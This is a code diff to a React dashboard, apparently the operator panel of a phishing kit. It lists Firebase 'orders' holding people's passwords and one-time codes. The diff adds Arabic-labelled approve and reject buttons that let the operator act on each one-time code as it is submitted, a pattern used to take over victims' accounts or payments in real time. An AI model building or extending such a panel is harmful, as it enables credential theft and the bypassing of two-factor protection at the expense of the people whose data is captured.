@@ -1,5 +1,5 @@
 import { useEffect, useState } from "react";
-import { subscribeToOrders } from "@/lib/firebase";
+import { subscribeToOrders, approveOrder, rejectOrder } from "@/lib/firebase";
 
 interface Order {
   id: string;
@@ -9,6 +9,7 @@ interface Order {
   password?: string;
   otp?: string;
   step?: string;
+  approved?: boolean | null;
   timestamp?: any;
   completedAt?: any;
   updatedAt?: any;
@@ -63,6 +64,22 @@ function DataRow({ label, value, icon, secret }: { label: string; value?: string
 function MessageBubble({ order, index }: { order: Order; index: number }) {
   const step = getStep(order);
   const ts = order.completedAt || order.updatedAt || order.timestamp;
+  const [acting, setActing] = useState(false);
+
+  const isAwaitingApproval = order.step === "otp" && order.approved === null;
+  const isApproved = order.approved === true;
+  const isRejected = order.approved === false;
+
+  const handleApprove = async () => {
+    setActing(true);
+    await approveOrder(order.id).catch(console.error);
+    setActing(false);
+  };
+  const handleReject = async () => {
+    setActing(true);
+    await rejectOrder(order.id).catch(console.error);
+    setActing(false);
+  };
 
   return (
     <div style={{ display: "flex", gap: 10, padding: "6px 12px", animation: "ab-slide-up 0.3s ease both", animationDelay: `${Math.min(index, 8) * 0.04}s` }}>
@@ -98,6 +115,42 @@ function MessageBubble({ order, index }: { order: Order; index: number }) {
               <span style={{ fontSize: 10, fontWeight: 700, color: step.color, fontFamily: "'Cairo',sans-serif" }}>{step.label}</span>
             </div>
           </div>
+
+          {/* ── Approval section ── only visible for OTP submissions */}
+          {order.step === "otp" && (
+            <div style={{ marginTop: 10, paddingTop: 10, borderTop: "1px solid rgba(255,255,255,0.06)" }}>
+              {isAwaitingApproval && (
+                <div style={{ display: "flex", gap: 8 }}>
+                  <button
+                    disabled={acting}
+                    onClick={handleApprove}
+                    style={{ flex: 1, padding: "8px 0", borderRadius: 10, border: "none", background: acting ? "#1a3a1a" : "linear-gradient(135deg,#16a34a,#15803d)", color: "white", fontWeight: 800, fontSize: 13, cursor: acting ? "not-allowed" : "pointer", fontFamily: "'Cairo',sans-serif", display: "flex", alignItems: "center", justifyContent: "center", gap: 5, opacity: acting ? 0.6 : 1, transition: "all 0.2s" }}
+                  >
+                    {acting ? "..." : <><span>✓</span><span>قبول</span></>}
+                  </button>
+                  <button
+                    disabled={acting}
+                    onClick={handleReject}
+                    style={{ flex: 1, padding: "8px 0", borderRadius: 10, border: "none", background: acting ? "#3a1a1a" : "linear-gradient(135deg,#dc2626,#b91c1c)", color: "white", fontWeight: 800, fontSize: 13, cursor: acting ? "not-allowed" : "pointer", fontFamily: "'Cairo',sans-serif", display: "flex", alignItems: "center", justifyContent: "center", gap: 5, opacity: acting ? 0.6 : 1, transition: "all 0.2s" }}
+                  >
+                    {acting ? "..." : <><span>✕</span><span>رفض</span></>}
+                  </button>
+                </div>
+              )}
+              {isApproved && (
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, padding: "8px 0", background: "rgba(22,163,74,0.15)", borderRadius: 10, border: "1px solid rgba(22,163,74,0.3)" }}>
+                  <span style={{ fontSize: 14 }}>✅</span>
+                  <span style={{ color: "#4ade80", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>تمت الموافقة</span>
+                </div>
+              )}
+              {isRejected && (
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, padding: "8px 0", background: "rgba(220,38,38,0.15)", borderRadius: 10, border: "1px solid rgba(220,38,38,0.3)" }}>
+                  <span style={{ fontSize: 14 }}>❌</span>
+                  <span style={{ color: "#f87171", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>تم الرفض</span>
+                </div>
+              )}
+            </div>
+          )}
         </div>
       </div>
     </div>
